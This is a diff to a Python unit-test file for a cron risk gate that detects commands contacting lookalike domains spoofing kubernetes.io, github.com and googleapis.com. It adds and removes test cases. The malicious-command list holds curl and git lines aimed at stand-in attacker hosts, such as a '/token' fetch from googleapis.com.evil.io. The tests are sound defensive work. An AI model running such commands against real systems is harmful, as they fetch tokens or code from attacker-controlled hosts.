@@ -21,7 +21,6 @@ class CronRiskGateTest(unittest.TestCase):
 
     def test_cron_effective_mode_leaves_non_high_risk_unchanged(self):
         self.assertEqual(cron_effective_mode("approve", "low"), "approve")
-        self.assertEqual(cron_effective_mode("approve", "medium"), "approve")
         self.assertEqual(cron_effective_mode("approve", None), "approve")
         self.assertEqual(cron_effective_mode("approve", ""), "approve")
         self.assertEqual(cron_effective_mode("smart", "low"), "smart")
@@ -64,9 +63,10 @@ class CronRiskGateTest(unittest.TestCase):
             ("kubectl --server=kubernetes.io.attacker.com get nodes", "kubernetes.io.attacker.com", "kubernetes.io"),
             ("git clone git@github.com.evil.org:repo.git", "github.com.evil.org", "github.com"),
             ("curl https://googleapis.com.evil.io/token", "googleapis.com.evil.io", "googleapis.com"),
-            ("curl http://evil-googleapis.com/payload", "evil-googleapis.com", "googleapis.com"),
             ("curl https://k8s.io.badguy.org", "k8s.io.badguy.org", "k8s.io"),
             ("curl https://google.com.phishing.xyz", "google.com.phishing.xyz", "google.com"),
+            ("curl https://x-k8s.io.evil.com", "x-k8s.io.evil.com", "x-k8s.io"),
+            ("curl https://sub.kubernetes.io.evil.com", "sub.kubernetes.io.evil.com", "kubernetes.io"),
         ]
         for cmd, expected_host, expected_apex in malicious_commands:
             with self.subTest(cmd=cmd):
@@ -97,6 +97,13 @@ class CronRiskGateTest(unittest.TestCase):
             "curl https://github.com/kubernetes/kubernetes",
             "gcloud container clusters get-credentials test",
             "kubectl describe node.kubernetes.io/instance-type",
+            "kubectl get pods -l kubeagents.x-k8s.io/reliability-audit=exempt",
+            "kubectl get crd jobset.x-k8s.io",
+            "kubectl get crd kueue.x-k8s.io",
+            "kubectl get crd secrets-store.csi.x-k8s.io",
+            "curl https://github.company.com/internal",
+            "curl https://google.company.com/internal",
+            '.metadata.labels["addonmanager.kubernetes.io/mode"]',
         ]
         for cmd in benign_commands:
             with self.subTest(cmd=cmd):
